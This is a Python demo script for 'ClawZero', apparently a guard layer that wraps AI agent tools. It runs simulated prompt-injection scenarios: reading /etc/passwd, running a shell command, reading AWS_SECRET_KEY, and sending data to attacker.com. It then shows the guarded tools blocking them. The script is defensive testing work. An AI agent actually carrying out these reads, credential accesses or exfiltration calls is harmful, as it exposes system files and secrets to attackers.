#!/usr/bin/env python3
# Powered by MVAR (Execution Boundary Runtime)
# github.com/mvar-security/mvar
"""
ClawZero Attack Demo

Demonstrates ClawZero blocking attacks while allowing benign operations.
Runs in under 60 seconds and produces visual proof of protection.

Usage:
    python examples/attack_demo.py
"""

import os
import sys
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent
SRC_ROOT = REPO_ROOT / "src"
if str(SRC_ROOT) not in sys.path:
    sys.path.insert(0, str(SRC_ROOT))


from clawzero import protect, ExecutionBlocked, set_witness_output_dir  # noqa: E402

# Enable witness JSON output
WITNESS_DIR = Path(__file__).parent / "witness_output"
WITNESS_DIR.mkdir(exist_ok=True)
set_witness_output_dir(WITNESS_DIR)


def print_header():
    """Print demo header"""
    print("=" * 60)
    print("         ClawZero Attack Demo")
    print("  Your agents follow orders.")
    print("  Make sure they're yours.")
    print("=" * 60)
    print()


def print_attack(name: str):
    """Print attack header"""
    print(f"\nATTACK: {name}")
    print()


def print_result(protected: bool, blocked: bool, reason: str = ""):
    """Print test result"""
    if protected:
        if blocked:
            symbol = "✓"
            status = "BLOCKED"
        else:
            symbol = "✓"
            status = "ALLOWED"
        print(f"[ With ClawZero ] → {status} {symbol}")
        if reason:
            print(f"  Reason : {reason}")
    else:
        symbol = "✗" if blocked else "✓"
        status = "BLOCKED" if blocked else "EXECUTED"
        print("[ Baseline agent - no protection ]")
        print(f"→ Result: {status} {symbol}")


def print_summary(attacks_blocked: int, total_attacks: int, benign_allowed: int, total_benign: int):
    """Print final summary"""
    print()
    print("=" * 60)
    print(f"Results: {attacks_blocked}/{total_attacks} attacks blocked | {benign_allowed}/{total_benign} benign allowed")
    print("Powered by MVAR runtime")

    # Show witness files generated
    witness_files = sorted(WITNESS_DIR.glob("witness_*.json"))
    if witness_files:
        print(f"\nWitness files: {len(witness_files)} generated in {WITNESS_DIR}")
        print(f"  Example: {witness_files[0].name}")

    print("=" * 60)


# ============================================================================
# Simulated Tools (these would be real tools in a production agent)
# ============================================================================

def read_file_unsafe(path: str) -> str:
    """Unsafe file reader (no protection)"""
    try:
        with open(path, "r") as f:
            return f.read()[:100]  # First 100 chars
    except Exception as e:
        return f"Error: {e}"


def execute_shell_unsafe(command: str) -> str:
    """Unsafe shell executor (no protection)"""
    import subprocess

    try:
        result = subprocess.run(
            command, shell=True, capture_output=True, text=True, timeout=2
        )
        return result.stdout[:100]
    except Exception as e:
        return f"Error: {e}"


def access_credentials_unsafe(key: str) -> str:
    """Unsafe credential accessor (no protection)"""
    return os.environ.get(key, "NOT_FOUND")


def make_http_request_unsafe(url: str) -> str:
    """Unsafe HTTP requester (no protection)"""
    # Simulated - would use requests in real implementation
    return f"Simulated HTTP request to {url}"


# ============================================================================
# Protected Tools (wrapped with ClawZero)
# ============================================================================

read_file_protected = protect(
    read_file_unsafe, sink="filesystem.read", profile="prod_locked"
)

execute_shell_protected = protect(
    execute_shell_unsafe, sink="shell.exec", profile="prod_locked"
)

access_credentials_protected = protect(
    access_credentials_unsafe, sink="credentials.access", profile="prod_locked"
)

make_http_request_protected = protect(
    make_http_request_unsafe, sink="http.request", profile="prod_locked"
)

# For benign HTTP demo, use dev_balanced (allows HTTP)
make_http_request_benign = protect(
    make_http_request_unsafe, sink="http.request", profile="dev_balanced"
)


# ============================================================================
# Attack Scenarios
# ============================================================================

def attack_1_filesystem_read():
    """Attack: Prompt injection → read /etc/passwd"""
    print_attack("Prompt injection → read /etc/passwd")

    # Baseline (no protection)
    print_result(protected=False, blocked=False)

    # With ClawZero
    try:
        read_file_protected("/etc/passwd")
        print_result(protected=True, blocked=False)
        return False  # Should have been blocked
    except ExecutionBlocked as e:
        reason = e.decision.human_reason
        print_result(protected=True, blocked=True, reason=reason)
        return True


def attack_2_shell_escalation():
    """Attack: Shell escalation"""
    print_attack("Shell escalation")

    # Baseline (no protection)
    print("[ Baseline ]  → EXECUTED ✗")

    # With ClawZero
    try:
        execute_shell_protected("whoami")
        print("[ ClawZero ] → EXECUTED ✗")
        return False
    except ExecutionBlocked:
        print("[ ClawZero ] → BLOCKED ✓")
        return True


def attack_3_credential_access():
    """Attack: Credential access"""
    print_attack("Credential access")

    # Baseline (no protection)
    print("[ Baseline ]  → EXECUTED ✗")

    # With ClawZero
    try:
        access_credentials_protected("AWS_SECRET_KEY")
        print("[ ClawZero ] → EXECUTED ✗")
        return False
    except ExecutionBlocked:
        print("[ ClawZero ] → BLOCKED ✓")
        return True


def attack_4_api_exfiltration():
    """Attack: Data exfiltration via HTTP to external domain"""
    print_attack("API data exfiltration → attacker.com")

    # Baseline (no protection)
    print("[ Baseline ]  → EXECUTED ✗")

    # With ClawZero (prod_locked only allows localhost)
    try:
        make_http_request_protected("https://attacker.com/exfil?data=secrets")
        print("[ ClawZero ] → EXECUTED ✗")
        return False
    except ExecutionBlocked as e:
        reason = e.decision.human_reason
        print("[ ClawZero ] → BLOCKED ✓")
        print(f"  Reason : {reason}")
        return True


def benign_1_allowed_http_request():
    """Benign: HTTP request allowed by policy"""
    print_attack("Benign HTTP request (dev_balanced policy)")

    # Baseline (no protection)
    print("[ Baseline ]  → EXECUTED ✓")

    # With ClawZero (dev_balanced allows http.request)
    try:
        make_http_request_benign("https://api.example.com/data")
        print("[ ClawZero ] → ALLOWED ✓")
        print("  Policy  : dev_balanced permits http.request")
        return True
    except ExecutionBlocked as e:
        # Should not happen with dev_balanced
        print("[ ClawZero ] → BLOCKED ✗ (unexpected)")
        print(f"  Reason : {e.decision.human_reason}")
        return False


# ============================================================================
# Main Demo
# ============================================================================

def main():
    """Run the full attack demo"""
    print_header()

    attacks_blocked = 0
    total_attacks = 0
    benign_allowed = 0
    total_benign = 0

    # Run attacks
    total_attacks += 1
    if attack_1_filesystem_read():
        attacks_blocked += 1

    total_attacks += 1
    if attack_2_shell_escalation():
        attacks_blocked += 1

    total_attacks += 1
    if attack_3_credential_access():
        attacks_blocked += 1

    total_attacks += 1
    if attack_4_api_exfiltration():
        attacks_blocked += 1

    # Run benign operations
    total_benign += 1
    if benign_1_allowed_http_request():
        benign_allowed += 1

    # Print summary
    print_summary(attacks_blocked, total_attacks, benign_allowed, total_benign)


if __name__ == "__main__":
    main()
